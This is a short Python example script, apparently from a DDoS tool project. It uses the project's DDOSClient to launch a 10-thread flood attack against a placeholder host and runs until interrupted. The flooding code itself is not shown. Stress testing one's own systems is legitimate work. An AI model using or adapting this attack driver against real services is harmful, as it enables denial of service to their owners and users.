"""
Sample attack script demonstrating how to use the DDoS tool programmatically
"""

import sys
import os
import time

# Add src to path for relative imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from ddos_tool.core.ddos_client import DDOSClient
import threading


def run_sample_attack():
    """Run a sample attack with predefined parameters"""
    print("Running sample DDoS attack...")
    print("=" * 50)

    client = DDOSClient("http://your-test-environment.local", 10)

    print(f"Target: {client.target}")
    print(f"Threads: {client.num_threads}")
    print("Starting attack in 3 seconds...")
    print("Press Ctrl+C to stop")
    print("=" * 50)

    # Give user time to cancel if needed
    time.sleep(3)

    try:
        # Start attack (will run until interrupted)
        client.start_attack()
    except KeyboardInterrupt:
        print("\nSample attack stopped by user")
    except Exception as e:
        print(f"\nSample attack encountered an error: {e}")


if __name__ == "__main__":
    run_sample_attack()
